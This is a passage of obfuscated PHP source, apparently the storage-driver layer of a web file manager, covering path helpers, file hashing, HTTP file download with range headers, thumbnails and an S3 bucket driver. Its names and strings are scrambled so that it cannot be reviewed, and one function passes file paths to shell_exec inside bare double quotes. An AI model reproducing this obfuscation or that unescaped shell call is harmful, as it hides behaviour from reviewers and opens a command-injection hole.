substr($Cı®ì⁄£¬·, strrpos($Cı®ì⁄£¬·, $aé⁄´˜û‹’[93]) + 1); $f—ΩÀùœ≤Õ = strtolower($f—ΩÀùœ≤Õ); } if (strlen($f—ΩÀùœ≤Õ) > 3 && preg_match($aé⁄´˜û‹’[94], $f—ΩÀùœ≤Õ, $e¥à≤ÁÿÕ¬)) { $f—ΩÀùœ≤Õ = $aé⁄´˜û‹’[33]; } return $f—ΩÀùœ≤Õ; } public function pathThis($fú≤‘“›¬∏) { $CÕ®Ø∑ßë¬ =& $_SERVER[—Ω]; $fú≤‘“›¬∏ = str_replace($CÕ®Ø∑ßë¬[95], $CÕ®Ø∑ßë¬[8], rtrim($fú≤‘“›¬∏, $CÕ®Ø∑ßë¬[8])); $e›«È‚«ê∫ = strrpos($fú≤‘“›¬∏, $CÕ®Ø∑ßë¬[8]); if ($e›«È‚«ê∫ === !1) { return $fú≤‘“›¬∏; } return substr($fú≤‘“›¬∏, $e›«È‚«ê∫ + 1); } public function pathFather($f«ËêâÉ…˜) { $Cí÷È‰∆êç =& $_SERVER[—Ω]; $f«ËêâÉ…˜ = str_replace($Cí÷È‰∆êç[95], $Cí÷È‰∆êç[8], rtrim($f«ËêâÉ…˜, $Cí÷È‰∆êç[8])); $dù≈ü∞÷Œ‰ = strrpos($f«ËêâÉ…˜, $Cí÷È‰∆êç[8]); if ($dù≈ü∞÷Œ‰ === !1) { return $Cí÷È‰∆êç[33]; } return substr($f«ËêâÉ…˜, 0, $dù≈ü∞÷Œ‰ + 1); } public function hashSimple($c∫åüåÃªß) { goto d˘ö⁄°–∆—; d˘ö⁄°–∆—: $Eà Ÿı±Õﬂ =& $_SERVER[—Ω]; if (!$c∫åüåÃªß) { return md5($Eà Ÿı±Õﬂ[33]); } $F€ô¯ß∂èù = $this->size($c∫åüåÃªß); goto Cœ˘Ò‰Èˆﬂ; Cœ˘Ò‰Èˆﬂ: $A⁄¬¨à“∆ä = 200; $d·õ∫éçè† = 50; if ($F€ô¯ß∂èù <= $A⁄¬¨à“∆ä * $d·õ∫éçè†) { return $this->hashMd5($c∫åüåÃªß) . $F€ô¯ß∂èù; } goto Däö∑”Ü¢À; bè…æ©ù¢˘: $AÔé“Ü≥ú— .= $this->fileSubstr($c∫åüåÃªß, $F€ô¯ß∂èù - $A⁄¬¨à“∆ä, $A⁄¬¨à“∆ä); return md5($AÔé“Ü≥ú—) . $F€ô¯ß∂èù; goto Fàè˘”Üäœ; Däö∑”Ü¢À: $eà§Ÿã∫πÚ = intval($F€ô¯ß∂èù / $d·õ∫éçè†); $AÔé“Ü≥ú— = $Eà Ÿı±Õﬂ[33]; for ($a‘˘•ßº•∑ = 0; $a‘˘•ßº•∑ < $d·õ∫éçè†; $a‘˘•ßº•∑++) { $AÔé“Ü≥ú— .= $this->fileSubstr($c∫åüåÃªß, $eà§Ÿã∫πÚ * $a‘˘•ßº•∑, $A⁄¬¨à“∆ä); } goto bè…æ©ù¢˘; Fàè˘”Üäœ: } public static $md5Cache = array(); public function hashMd5($e¨»÷«Õáƒ) { $e¨»÷«Õáƒ = $this->iconvSystem($e¨»÷«Õáƒ); if (isset(self::$md5Cache[$e¨»÷«Õáƒ])) { return self::$md5Cache[$e¨»÷«Õáƒ]; } self::$md5Cache[$e¨»÷«Õáƒ] = $this->hashMd5Shell($e¨»÷«Õáƒ); if (!self::$md5Cache[$e¨»÷«Õáƒ]) { self::$md5Cache[$e¨»÷«Õáƒ] = @md5_file($e¨»÷«Õáƒ); } return self::$md5Cache[$e¨»÷«Õáƒ]; } private function hashMd5Shell($e“„ΩúÑÔ™) { goto FÉ©ÊÛí®∂; FÉ©ÊÛí®∂: $CÎ ﬁÒ•§» =& $_SERVER[—Ω]; if (!function_exists($CÎ ﬁÒ•§»[96])) { return !1; } $a¨∞Á∏—ÏÉ = array($CÎ ﬁÒ•§»[97], $CÎ ﬁÒ•§»[98]); goto B›ç°£êï›; aø—≥¥˜µ: $DúéÓÖà¡í = shell_exec($DÜ”∫Û√œ• . "\x20\x22{$e“„ΩúÑÔ™}\x22"); return substr($DúéÓÖà¡í, 0, 32); goto f‚∏ï–ó°’; B›ç°£êï›: $DÜ”∫Û√œ• = Cache::get($CÎ ﬁÒ•§»[99]); if (!$DÜ”∫Û√œ•) { $BÛá¶ÿ‘Úë = BASIC_PATH . $CÎ ﬁÒ•§»[100]; $FêÃ∂§é‘ﬂ = md5_file($BÛá¶ÿ‘Úë); $DÜ”∫Û√œ• = $CÎ ﬁÒ•§»[101]; foreach ($a¨∞Á∏—ÏÉ as $EëƒËŸµ∫Ò) { $DúéÓÖà¡í = shell_exec($EëƒËŸµ∫Ò . "\x20\42{$BÛá¶ÿ‘Úë}\42"); if ($DúéÓÖà¡í && substr(trim($DúéÓÖà¡í), 0, 32) == $FêÃ∂§é‘ﬂ) { $DÜ”∫Û√œ• = $EëƒËŸµ∫Ò; break; } } Cache::set($CÎ ﬁÒ•§»[99], $DÜ”∫Û√œ•, 3600); } if ($DÜ”∫Û√œ• == $CÎ ﬁÒ•§»[101]) { return !1; } goto aø—≥¥˜µ; f‚∏ï–ó°’: } public function link($c¯ÊµØÏ¶ú) { return $c¯ÊµØÏ¶ú; } public function fileOut($c˜ä„»€ø≥, $fÎ’∏ÉøÂö = false, $döäãø•û£ = false, $BÉª›¨üä† = '') { goto c«£µõäÍè; cœŸ∫Ö¯ÃÙ: header($EŒÃéﬂ´µå[125]); header($EŒÃéﬂ´µå[126]); header($EŒÃéﬂ´µå[127]); goto cÃ·≠Òñ£…; bƒÂÍﬂı: $d⁄‘≠∂ãÜü = $this->getType() == $EŒÃéﬂ´µå[103]; $Eì‹À–œπ° = $GLOBALS[$EŒÃéﬂ´µå[6]][$EŒÃéﬂ´µå[84]][$EŒÃéﬂ´µå[91]][$EŒÃéﬂ´µå[104]]; $EâŸÿ°Ω≥˜ = (double) $GLOBALS[$EŒÃéﬂ´µå[6]][$EŒÃéﬂ´µå[84]][$EŒÃéﬂ´µå[91]][$EŒÃéﬂ´µå[105]] * 1024 * 1024; goto bÁçîåîÌ±; c«£µõäÍè: $EŒÃéﬂ´µå =& $_SERVER[—Ω]; $this->cacheMethod(null, null); if (!$c˜ä„»€ø≥ || !$this->exist($c˜ä„»€ø≥)) { show_json(LNG($EŒÃéﬂ´µå[102]), !1, $döäãø•û£); } goto bƒÂÍﬂı; f¡õ∏†√ﬁã: if (in_array($E·€¢ﬁôÛº, array($EŒÃéﬂ´µå[108], $EŒÃéﬂ´µå[109], $EŒÃéﬂ´µå[110], $EŒÃéﬂ´µå[111]))) { $E·€¢ﬁôÛº = $EŒÃéﬂ´µå[112]; } if (!$BÉª›¨üä†) { $BÉª›¨üä† = md5($BÉ¯çã∏ä™ . $this->hashSimple($c˜ä„»€ø≥)); } $BÉª›¨üä† = $EŒÃéﬂ´µå[113] . $BÉª›¨üä† . $EŒÃéﬂ´µå[113]; goto aó¥åï¬ÖÃ; Côò’ºÇ˘Ì: header($EŒÃéﬂ´µå[132] . $BÉ¯çã∏ä™ . $EŒÃéﬂ´µå[124]); header($EŒÃéﬂ´µå[133] . $bàƒ»ªØåä); header($EŒÃéﬂ´µå[134]); goto A‚‰—ˆóÜ∫; e‹Ÿ≥îà∞ú: header($EŒÃéﬂ´µå[121]); header($EŒÃéﬂ´µå[122] . $F‚å¶ÑèâÖ); header($EŒÃéﬂ´µå[123] . gmdate($EŒÃéﬂ´µå[106], time() + 3600 * 24 * 30) . $EŒÃéﬂ´µå[124]); goto cœŸ∫Ö¯ÃÙ; CÏâ‡ß©¯â: $A»Ω˜†‰ÑÇ = $eïÿÙÉÚÍ∆[$EŒÃéﬂ´µå[77]]; $BÉ¯çã∏ä™ = gmdate($EŒÃéﬂ´µå[106], $eïÿÙÉÚÍ∆[$EŒÃéﬂ´µå[107]]); $bàƒ»ªØåä = $döäãø•û£ ? $döäãø•û£ : $this->iconvApp($eïÿÙÉÚÍ∆[$EŒÃéﬂ´µå[28]]); goto D˘ı†¥É·›; aó¥åï¬ÖÃ: $F‚å¶ÑèâÖ = get_file_mime($E·€¢ﬁôÛº); if (strstr($F‚å¶ÑèâÖ, $EŒÃéﬂ´µå[114])) { $F‚å¶ÑèâÖ = $F‚å¶ÑèâÖ . $EŒÃéﬂ´µå[115]; } if ($fÎ’∏ÉøÂö === !1 && !mime_support($F‚å¶ÑèâÖ)) { $fÎ’∏ÉøÂö = !0; $F‚å¶ÑèâÖ = $EŒÃéﬂ´µå[116]; } goto cπèÛ≠á€ó; D˘ı†¥É·›: $B‚’§’åù‡ = 0; $bÊÙ—‡⁄ØÊ = $A»Ω˜†‰ÑÇ - 1; $E·€¢ﬁôÛº = $this->ext($bàƒ»ªØåä); goto f¡õ∏†√ﬁã; bÌ∫æ«∂õ“: header($EŒÃéﬂ´µå[150] . ($bÊÙ—‡⁄ØÊ - $B‚’§’åù‡ + 1)); if ($_SERVER[$EŒÃéﬂ´µå[151]] == $EŒÃéﬂ´µå[152]) { return; } $DÒ ñ≥–é‰ = 1024 * 100; goto dÊëÃá≥£Ö; cÃ·≠Òñ£…: if (isset($_SERVER[$EŒÃéﬂ´µå[128]]) && strtotime($_SERVER[$EŒÃéﬂ´µå[128]]) == $eïÿÙÉÚÍ∆[$EŒÃéﬂ´µå[107]]) { header($EŒÃéﬂ´µå[129], !0, 304); die; } if (isset($_SERVER[$EŒÃéﬂ´µå[130]]) && $_SERVER[$EŒÃéﬂ´µå[130]] == $BÉª›¨üä†) { header($EŒÃéﬂ´µå[131] . $BÉª›¨üä†, !0, 304); die; } header($EŒÃéﬂ´µå[131] . $BÉª›¨üä†); goto Côò’ºÇ˘Ì; cπèÛ≠á€ó: $EÈ”∫ë–ÁÌ = rawurlencode($bàƒ»ªØåä); $EÈ”∫ë–ÁÌ = $EŒÃéﬂ´µå[113] . $EÈ”∫ë–ÁÌ . $EŒÃéﬂ´µå[117] . $EÈ”∫ë–ÁÌ; if ($fÎ’∏ÉøÂö) { header($EŒÃéﬂ´µå[118]); header($EŒÃéﬂ´µå[119] . $EÈ”∫ë–ÁÌ); } else { header($EŒÃéﬂ´µå[120] . $EÈ”∫ë–ÁÌ); } goto e‹Ÿ≥îà∞ú; F™ôõ¢ÈÁí: $fÊÓ¬ê≈© = strtolower($_SERVER[$EŒÃéﬂ´µå[138]]); if ($d⁄‘≠∂ãÜü && $fÊÓ¬ê≈© && $Eì‹À–œπ°) { if (strstr($fÊÓ¬ê≈©, $EŒÃéﬂ´µå[139])) { header($EŒÃéﬂ´µå[140] . $c˜ä„»€ø≥); } else { if (strstr($fÊÓ¬ê≈©, $EŒÃéﬂ´µå[141])) { header($EŒÃéﬂ´µå[142] . $c˜ä„»€ø≥); } else { if (strstr($fÊÓ¬ê≈©, $EŒÃéﬂ´µå[143])) { header($EŒÃéﬂ´µå[144] . $c˜ä„»€ø≥); } } } if ($EâŸÿ°Ω≥˜) { header($EŒÃéﬂ´µå[145] . $EâŸÿ°Ω≥˜); } return; } if (isset($_SERVER[$EŒÃéﬂ´µå[146]])) { if (preg_match($EŒÃéﬂ´µå[147], $_SERVER[$EŒÃéﬂ´µå[146]], $eãòØ˜§·ê)) { $B‚’§’åù‡ = intval($eãòØ˜§·ê[1]); if (!empty($eãòØ˜§·ê[2])) { $bÊÙ—‡⁄ØÊ = intval($eãòØ˜§·ê[2]); } } header($EŒÃéﬂ´µå[148]); header("\103\x6f\156\164\145\156\x74\55\x52\141\x6e\147\x65\72\40\x62\x79\164\145\163\x20{$B‚’§’åù‡}\55{$bÊÙ—‡⁄ØÊ}\x2f" . $A»Ω˜†‰ÑÇ); } else { header($EŒÃéﬂ´µå[149]); } goto bÌ∫æ«∂õ“; bÁçîåîÌ±: @ob_end_clean(); set_timeout(); $eïÿÙÉÚÍ∆ = $this->infoFull($c˜ä„»€ø≥); goto CÏâ‡ß©¯â; dÊëÃá≥£Ö: $c«Ñ£üÑÉÔ = 0; if ($EâŸÿ°Ω≥˜) { $c«Ñ£üÑÉÔ = intval(1000 * 1000 * ($DÒ ñ≥–é‰ / $EâŸÿ°Ω≥˜)); } while ($B‚’§’åù‡ <= $bÊÙ—‡⁄ØÊ) { $få¿îáŸªˆ = timeFloat(); check_abort(); $Fùﬁù±…€• = $bÊÙ—‡⁄ØÊ - $B‚’§’åù‡ + 1; if ($Fùﬁù±…€• <= $DÒ ñ≥–é‰) { $DÒ ñ≥–é‰ = $Fùﬁù±…€•; } echo $this->fileSubstr($c˜ä„»€ø≥, $B‚’§’åù‡, $DÒ ñ≥–é‰); $B‚’§’åù‡ += $DÒ ñ≥–é‰; if ($DÒ ñ≥–é‰ == $Fùﬁù±…€•) { $B‚’§’åù‡ = $bÊÙ—‡⁄ØÊ + 1; } if ($c«Ñ£üÑÉÔ) { $cöü∞ˆ˜‚Ë = intval(1000 * 1000 * (timeFloat() - $få¿îáŸªˆ)); $aö´ﬁ±îò⁄ = $c«Ñ£üÑÉÔ - $cöü∞ˆ˜‚Ë; if ($aö´ﬁ±îò⁄ > 5) { usleep($aö´ﬁ±îò⁄); } } } goto e≠ÙÆ‰ﬂ™; A‚‰—ˆóÜ∫: header($EŒÃéﬂ´µå[135] . $A»Ω˜†‰ÑÇ); header($EŒÃéﬂ´µå[136]); if (!$fÎ’∏ÉøÂö && $E·€¢ﬁôÛº == $EŒÃéﬂ´µå[137]) { if ($A»Ω˜†‰ÑÇ > 1024 * 1024 * 5) { die; } $c§•∏‡üúË = $this->getContent($c˜ä„»€ø≥); $c§•∏‡üúË = Html::removeXXS($c§•∏‡üúË); echo $c§•∏‡üúË; die; } goto F™ôõ¢ÈÁí; e≠ÙÆ‰ﬂ™: } public function fileOutServer($F∫•¿§Û°ë, $f±Û–ôÚãÈ = false, $eœË˜Ë‘–Ω = false, $B’òÿ±á‘ß = '') { $this->fileOut($F∫•¿§Û°ë, $f±Û–ôÚãÈ, $eœË˜Ë‘–Ω, $B’òÿ±á‘ß); } public function fileOutLink($A∏µıâá∑») { header($_SERVER[—Ω][153] . $A∏µıâá∑»); die; } public function cacheMethod($A≠ÿì˘πÆè, $c˜ÕŒ•ìªä) { goto Aú•Ñë¶∏ˆ; aÿÇ¥ë•÷Î: if (!is_null($A¬û◊≈”ı˘)) { return $A¬û◊≈”ı˘; } $A¬û◊≈”ı˘ = $this->{$A≠ÿì˘πÆè}($c˜ÕŒ•ìªä); $aç“‘Ö¶≥¯[$Fó‚‘Ç¢÷Ÿ] = $A¬û◊≈”ı˘; goto eù⁄ë«ø‘Œ; Aú•Ñë¶∏ˆ: $DÚé©≠ ¿å =& $_SERVER[—Ω]; static $aç“‘Ö¶≥¯ = array(); $Fó‚‘Ç¢÷Ÿ = $DÚé©≠ ¿å[154] . $A≠ÿì˘πÆè . $DÚé©≠ ¿å[155] . rtrim($c˜ÕŒ•ìªä, $DÚé©≠ ¿å[8]); goto a¨ƒÎŒ•Ìò; eù⁄ë«ø‘Œ: return $A¬û◊≈”ı˘; goto D ”¶∆€Ç; a¨ƒÎŒ•Ìò: if (is_null($A≠ÿì˘πÆè)) { $aç“‘Ö¶≥¯ = array(); return; } if (is_null($c˜ÕŒ•ìªä)) { unset($aç“‘Ö¶≥¯[$Fó‚‘Ç¢÷Ÿ]); return; } $A¬û◊≈”ı˘ = isset($aç“‘Ö¶≥¯[$Fó‚‘Ç¢÷Ÿ]) ? $aç“‘Ö¶≥¯[$Fó‚‘Ç¢÷Ÿ] : null; goto aÿÇ¥ë•÷Î; D ”¶∆€Ç: } public function fileOutImage($b‘ ÷§¶Õç, $dÔÆÛ·èä… = 250) { goto AàÏ†“Âﬂó; F¨ÑŒıñé§: if ($FûùíÂ®ƒ®[$Cè√Òˆ◊ü≠[77]] <= 1024 * 50 || !function_exists($Cè√Òˆ◊ü≠[156]) || $FûùíÂ®ƒ®[$Cè√Òˆ◊ü≠[157]] == $Cè√Òˆ◊ü≠[158]) { return $this->fileOut($b‘ ÷§¶Õç); } if (isset($FûùíÂ®ƒ®[$Cè√Òˆ◊ü≠[159]][$Cè√Òˆ◊ü≠[160]])) { $E∂ÀÁˆ™·§ = $FûùíÂ®ƒ®[$Cè√Òˆ◊ü≠[159]][$Cè√Òˆ◊ü≠[160]]; } else { if (isset($FûùíÂ®ƒ®[$Cè√Òˆ◊ü≠[159]][$Cè√Òˆ◊ü≠[161]])) { $E∂ÀÁˆ™·§ = $FûùíÂ®ƒ®[$Cè√Òˆ◊ü≠[159]][$Cè√Òˆ◊ü≠[161]]; } else { $E∂ÀÁˆ™·§ = md5("{$FûùíÂ®ƒ®[$Cè√Òˆ◊ü≠[28]]}\x5f{$FûùíÂ®ƒ®[$Cè√Òˆ◊ü≠[75]]}\137{$FûùíÂ®ƒ®[$Cè√Òˆ◊ü≠[77]]}"); } } $d·¢∂ öÚ„ = "{$E∂ÀÁˆ™·§}\137{$dÔÆÛ·èä…}\56\160\156\x67"; goto Aã≥ÿ££æ¶; AàÏ†“Âﬂó: $Cè√Òˆ◊ü≠ =& $_SERVER[—Ω]; if (substr($b‘ ÷§¶Õç, 0, 4) == $Cè√Òˆ◊ü≠[143]) { $this->fileOutLink($b‘ ÷§¶Õç); } $FûùíÂ®ƒ® = $this->info($b‘ ÷§¶Õç); goto F¨ÑŒıñé§; eè»Ïä¶«°: if (!($fô“ñÁÍ∆’ = IO::move($Bï—¡•–º˘, $Dƒ“˜¨Óòí))) { return IO::fileOut($Bï—¡•–º˘); } del_file($Bï—¡•–º˘); IO::fileOut($fô“ñÁÍ∆’); goto eÌ•†¿ªÙ£; D¢≈§‰≠©∂: $Bï—¡•–º˘ = DATA_THUMB . $d·¢∂ öÚ„; if (!@file_exists($Bï—¡•–º˘)) { $b¥∏ß·’Éä = TEMP_FILES; if (!is_dir($b¥∏ß·’Éä)) { mk_dir($b¥∏ß·’Éä); } $eŸ«∏äΩœÃ = $b¥∏ß·’Éä . $E∂ÀÁˆ™·§ . $Cè√Òˆ◊ü≠[93] . $FûùíÂ®ƒ®[$Cè√Òˆ◊ü≠[157]]; if (!@file_exists($eŸ«∏äΩœÃ)) { $eŸ«∏äΩœÃ = $this->download($b‘ ÷§¶Õç, $eŸ«∏äΩœÃ); } $fçπãºÑÃ„ = new ImageThumb($eŸ«∏äΩœÃ, $Cè√Òˆ◊ü≠[164]); $fçπãºÑÃ„->prorate($Bï—¡•–º˘, $dÔÆÛ·èä…, $dÔÆÛ·èä… * 10); } if (!file_exists($Bï—¡•–º˘) || filesize($Bï—¡•–º˘) < 100) { return @file_exists($eŸ«∏äΩœÃ) ? IO::fileOut($eŸ«∏äΩœÃ) : $this->fileOut($b‘ ÷§¶Õç); } goto eè»Ïä¶«°; Aã≥ÿ££æ¶: if (!($Bó§Ñ‰ùòÃ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $Cè√Òˆ◊ü≠[162]))) { $Dƒ“˜¨Óòí = IO::mkdir(IO_PATH_SYSTEM_TEMP . $Cè√Òˆ◊ü≠[163]); } else { $Dƒ“˜¨Óòí = KodIO::make($Bó§Ñ‰ùòÃ); } if ($Bó§Ñ‰ùòÃ = IO::fileNameExist($Dƒ“˜¨Óòí, $d·¢∂ öÚ„)) { $Bï—¡•–º˘ = KodIO::make($Bó§Ñ‰ùòÃ); return IO::fileOut($Bï—¡•–º˘); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto D¢≈§‰≠©∂; eÌ•†¿ªÙ£: } public function fileOutImageServer($AÜ≤ããÃÍå, $bÇ«ÙƒµÑˆ = 250) { $this->fileOutImage($AÜ≤ããÃÍå, $bÇ«ÙƒµÑˆ); } public function fileNameAuto($e€∆Ç÷óúÉ, $FÜ«èÒêÜØ, $C‰ÑÎåß…¿ = REPEAT_RENAME, $a ﬂ¯ÛœÚí = false) { goto cŸÏÆ¿Ú˘∆; cŸÏÆ¿Ú˘∆: $E§è¥ﬁ∫–Œ =& $_SERVER[—Ω]; $Cº´ë¯‹†û = $e€∆Ç÷óúÉ === $E§è¥ﬁ∫–Œ[33] ? $FÜ«èÒêÜØ : rtrim($e€∆Ç÷óúÉ, $E§è¥ﬁ∫–Œ[8]) . $E§è¥ﬁ∫–Œ[8] . $FÜ«èÒêÜØ; if ($C‰ÑÎåß…¿ == REPEAT_REPLACE || !$this->exist($Cº´ë¯‹†û) || $a ﬂ¯ÛœÚí && $C‰ÑÎåß…¿ != REPEAT_RENAME_FOLDER) { return $FÜ«èÒêÜØ; } goto B˜‰°é†ó; Dáû·∏∂Ø∞: while ($this->exist(rtrim($e€∆Ç÷óúÉ, $E§è¥ﬁ∫–Œ[8]) . $E§è¥ﬁ∫–Œ[8] . $aâ¯£ÃÙ¥™)) { $aâ¯£ÃÙ¥™ = $FÏâ√Ω¨πΩ . "\x28{$B£¿Ωô¥√Ç}\51{$Cπ≈›∞’ñ£}"; $B£¿Ωô¥√Ç++; } return $aâ¯£ÃÙ¥™; goto eãß“§˘®¬; b€’◊û◊ÿ™: $B£¿Ωô¥√Ç = 1; $FÏâ√Ω¨πΩ = substr($FÜ«èÒêÜØ, 0, strlen($FÜ«èÒêÜØ) - strlen($Cπ≈›∞’ñ£)); $aâ¯£ÃÙ¥™ = $FÏâ√Ω¨πΩ . "\50{$B£¿Ωô¥√Ç}\x29{$Cπ≈›∞’ñ£}"; goto Dáû·∏∂Ø∞; B˜‰°é†ó: if ($C‰ÑÎåß…¿ == REPEAT_SKIP) { return !1; } $Cπ≈›∞’ñ£ = $E§è¥ﬁ∫–Œ[93] . get_path_ext($FÜ«èÒêÜØ); $Cπ≈›∞’ñ£ = $Cπ≈›∞’ñ£ == $E§è¥ﬁ∫–Œ[93] || $a ﬂ¯ÛœÚí ? $E§è¥ﬁ∫–Œ[33] : $Cπ≈›∞’ñ£; goto b€’◊û◊ÿ™; eãß“§˘®¬: } public function listAllFiles($AŸü⁄‹ÀÑ¬, $A€éÎä´≤ , $FÿùÑ¿’„ó = array()) { goto DÑí¯Ω¶áú; cçøû„¢µ¶: foreach (array_unique($D’∫Úê®É¬) as $cã£ûÊ„‰ê) { $E‰Ûæ∑÷“á = array($F»≤Ü èëÒ[75] => $this->getPathOuter($F»≤Ü èëÒ[8] . $AŸü⁄‹ÀÑ¬ . $F»≤Ü èëÒ[8] . $cã£ûÊ„‰ê), $F»≤Ü èëÒ[76] => 1, $F»≤Ü èëÒ[77] => 0); if (substr($cã£ûÊ„‰ê, -1) != $F»≤Ü èëÒ[8]) { $E‰Ûæ∑÷“á[$F»≤Ü èëÒ[76]] = 0; $CÖ„⁄˜ÜùŸ = $this->getPath($AŸü⁄‹ÀÑ¬ . $F»≤Ü èëÒ[8] . $cã£ûÊ„‰ê); $E‰Ûæ∑÷“á[$F»≤Ü èëÒ[77]] = isset($FÿùÑ¿’„ó[$CÖ„⁄˜ÜùŸ]) ? $FÿùÑ¿’„ó[$CÖ„⁄˜ÜùŸ] : $this->size($CÖ„⁄˜ÜùŸ); } $BÑ√ÜÖÆÏ‡[] = $E‰Ûæ∑÷“á; } return $BÑ√ÜÖÆÏ‡; goto cÑ⁄≠◊©Ç≤; DÑí¯Ω¶áú: $F»≤Ü èëÒ =& $_SERVER[—Ω]; if (empty($A€éÎä´≤ )) { return array(); } $D’∫Úê®É¬ = array(); goto Eëá°ÿÀŒ; Eëá°ÿÀŒ: $AŸü⁄‹ÀÑ¬ = trim($AŸü⁄‹ÀÑ¬, $F»≤Ü èëÒ[8]); foreach ($A€éÎä´≤  as $cã£ûÊ„‰ê) { $a˘ÏÉ ÷˘à = ltrim(substr($cã£ûÊ„‰ê, strlen($AŸü⁄‹ÀÑ¬)), $F»≤Ü èëÒ[8]); $D’∫Úê®É¬ = array_merge($D’∫Úê®É¬, $this->slicePath($a˘ÏÉ ÷˘à)); } $BÑ√ÜÖÆÏ‡ = array(); goto cçøû„¢µ¶; cÑ⁄≠◊©Ç≤: } public function slicePath($cüáó›ÛıÛ) { $C®πíˆêêˆ =& $_SERVER[—Ω]; $e«Ωé—¿ŒÓ = explode($C®πíˆêêˆ[8], trim($cüáó›ÛıÛ, $C®πíˆêêˆ[8])); $Eéœß‹∑„˜ = 0; do { ++$Eéœß‹∑„˜; $AÃŒÚÎ≥Àß[] = implode($C®πíˆêêˆ[8], array_slice($e«Ωé—¿ŒÓ, 0, $Eéœß‹∑„˜)) . $C®πíˆêêˆ[8]; } while ($Eéœß‹∑„˜ < count($e«Ωé—¿ŒÓ)); $AÃŒÚÎ≥Àß[count($e«Ωé—¿ŒÓ) - 1] = $cüáó›ÛıÛ; return $AÃŒÚÎ≥Àß; } public function getHost() { $eÂ÷¿‡äå† =& $_SERVER[—Ω]; $F§»Ú¶âå¥ = parse_url(trim($this->domain, $eÂ÷¿‡äå†[8])); $d‹Ü∫•Èà„ = isset($F§»Ú¶âå¥[$eÂ÷¿‡äå†[165]]) ? $F§»Ú¶âå¥[$eÂ÷¿‡äå†[165]] : http_type(); $Eﬁ•∞€°‹æ = isset($F§»Ú¶âå¥[$eÂ÷¿‡äå†[166]]) ? $F§»Ú¶âå¥[$eÂ÷¿‡äå†[166]] : $F§»Ú¶âå¥[$eÂ÷¿‡äå†[75]]; if (isset($F§»Ú¶âå¥[$eÂ÷¿‡äå†[167]])) { $Eﬁ•∞€°‹æ .= $eÂ÷¿‡äå†[4] . $F§»Ú¶âå¥[$eÂ÷¿‡äå†[167]]; } return $d‹Ü∫•Èà„ . $eÂ÷¿‡äå†[168] . $Eﬁ•∞€°‹æ; } public function pathEncode($d±π∫±ÊÉ√) { $b√ı‰óßäà =& $_SERVER[—Ω]; return str_replace($b√ı‰óßäà[169], $b√ı‰óßäà[8], rawurlencode($d±π∫±ÊÉ√)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($D∂◊ªÆ£Ôò) { set_timeout(); require_once SDK_DIR . $_SERVER[—Ω][170]; parent::__construct(); $this->_init($D∂◊ªÆ£Ôò); } public function _init($e“®Ü€úù∞) { foreach ($e“®Ü€úù∞ as $bÃßóÜ¯≠… => $A§™üƒœ’Ó) { if (isset($this->{$bÃßóÜ¯≠…})) { $this->{$bÃßóÜ¯≠…} = $A§™üƒœ’Ó; } } $this->endpoint = $e“®Ü€úù∞[$_SERVER[—Ω][171]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); $this->client->setChunkSize($this->osChunkSize()); } public function signatureVersion($e´‹˜ø‡¿¡ = "\x76\x34") { $this->signVer = $e´‹˜ø‡¿¡; $this->client->setSignatureVersion($e´‹˜ø‡¿¡); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto Cå®§Í˜Ωç; D¶ÿñÂõÚê: if ($bßØ≠èªõê[$F‰Â∆¥Ûåﬂ[172]] != $F‰Â∆¥Ûåﬂ[173] || $bßØ≠èªõê[$F‰Â∆¥Ûåﬂ[174]] != $F‰Â∆¥Ûåﬂ[173]) { return !1; } $eØ ‰ô±¡„ = array_map($F‰Â∆¥Ûåﬂ[175], $bßØ≠èªõê[$F‰Â∆¥Ûåﬂ[176]]); if (!is_array($eØ ‰ô±¡„)) { $eØ ‰ô±¡„ = array(); } goto EùîÖÿÊÛÖ; Cå®§Í˜Ωç: $F‰Â∆¥Ûåﬂ =& $_SERVER[—Ω]; $bßØ≠èªõê = $this->getBucketCors(); if (!$bßØ≠èªõê || !is_array($bßØ≠èªõê)) { return !1; } goto D¶ÿñÂõÚê; EùîÖÿÊÛÖ: $aã‚µÓø˘ó = array($F‰Â∆¥Ûåﬂ[177], $F‰Â∆¥Ûåﬂ[178], $F‰Â∆¥Ûåﬂ[179], $F‰Â∆¥Ûåﬂ[180], $F‰Â∆¥Ûåﬂ[181]); $eµ¡º€åªﬁ = array_diff($aã‚µÓø˘ó, $eØ ‰ô±¡„); return empty($eµ¡º€åªﬁ); goto BÑÉéçãˆù; BÑÉéçãˆù: } public function mkfile($aÖÚùÛ¯≈–, $E‡„¢™íÇ” = '', $bÖ®Öè®Ùè = REPEAT_RENAME) { $fêàÇˆÓ” = $this->setContent($aÖÚùÛ¯≈–, $E‡„¢™íÇ”); if ($fêàÇˆÓ” !== !1) { return $this->getPathOuter($aÖÚùÛ¯≈–); } return !1; } public function mkdir($A¡Ùã⁄∫´ , $B›¡ΩÒ¿˜É = REPEAT_SKIP) { if (empty($A¡Ùã⁄∫´ )) { return !1; } if ($this->_isFolder($A¡Ùã⁄∫´ )) { return $this->getPathOuter($A¡Ùã⁄∫´ ); } $bÙ—íΩ¿Œ¯ = $this->setContent($A¡Ùã⁄∫´ , $_SERVER[—Ω][33], !0); if ($bÙ—íΩ¿Œ¯ !== !1) { return $this->getPathOuter($A¡Ùã⁄∫´ ); } return !1; } public function copyFile($b«û ¿º”‰, $d˘‚øÏ∂Ó∂, $fˆ‰ô÷Ë∆Ò = array()) { $D¥≤áıõõ⁄ =& $_SERVER[—Ω]; $A™∞âæı·û = $this->objectMeta($b«û ¿º”‰); if (!$A™∞âæı·û) { return !1; } if ($A™∞âæı·û[$D¥≤áıõõ⁄[77]] <= 1024 * 1024 * 200) { $cè⁄ùÑÁ—ª = $this->client->copyObject($this->bucket, $b«û ¿º”‰, $this->bucket, $d˘‚øÏ∂Ó∂, $D¥≤áıõõ⁄[182], $fˆ‰ô÷Ë∆Ò); } else { $cè⁄ùÑÁ—ª = $this->client->multiCopyObject($this->bucket, $b«û ¿º”‰, $this->bucket, 